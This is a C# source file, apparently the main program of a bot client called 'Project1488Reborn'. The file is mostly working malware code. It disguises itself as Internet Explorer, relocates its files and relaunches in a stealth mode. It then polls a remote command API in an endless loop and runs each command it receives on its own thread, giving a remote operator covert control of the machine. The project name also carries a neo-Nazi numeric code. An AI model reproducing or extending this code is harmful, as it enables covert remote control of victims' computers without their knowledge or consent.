using HornetInc.JsonAPI;
using HornetInc.JsonAPI.Json;
using Project1488Reborn.Masks;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;

namespace Project1488Reborn
{
    public class Program
    {
        static List<Commands.Command> coms = new List<Commands.Command>();
        static List<Mask> masks = new List<Mask>();
        static ApiManager ai;
        public static ApiManager apiManager { 
            get
            {
                if (ai != null)
                    return ai;
                else
                    return ai = new ApiManager(Config.UrlToAPI);
            } 
        }
        static void Main(string[] args)
        {
            InitCommands();
            InitMasks();

            Masking(args);

            Console.WriteLine($"ID: {apiManager.Id}");

            WaitCommand();

            Console.ReadKey();
            Environment.Exit(0);
        }

        static void InitCommands()
        {
            //TODO: New Commands
            coms.Add(new Commands.CPing());
            coms.Add(new Commands.CMessage());

            
        }

        static void InitMasks()
        {
            //TODO: New Masks
            masks.Add(new MInternetExplorer());


        }

        static void Masking(string[] args)
        {
            if (args.Length != 0)
                return;

            Mask.AdditionalFilesMove = new List<FileInfo>()
            {
                new FileInfo("HornetInc.JsonAPI.dll"),
                new FileInfo("Vestris.ResourceLib.dll"),
                new FileInfo("Newtonsoft.Json.dll")
            };

            Mask mask = masks.ToArray()[new Random().Next(masks.Count - 1)];

            mask.MoveFiles();

            mask.StartInStealthMode();

            Environment.Exit(0);

        }

        static void WaitCommand()
        {
            while (true)
            {
                foreach (Command com in apiManager.GetNewCommands())
                {
                    Thread CH = new Thread(new ThreadStart(() =>
                    {
                        NewCommandHandler(com);
                    }));
                    CH.Start();
                }
                Thread.Sleep(250);
            }
        }

        static void NewCommandHandler(Command com)
        {
            Debug.WriteLine($"{com.Name}: {com.Value}");
            Console.WriteLine($"New command: {com.Name}: {com.Value}");
            foreach (Commands.Command commmand in coms)
            {
                if (commmand.IsTrueName(com.Name.ToLower()))
                {
                    commmand.Execute(com);
                }
            }
        }
    }
}
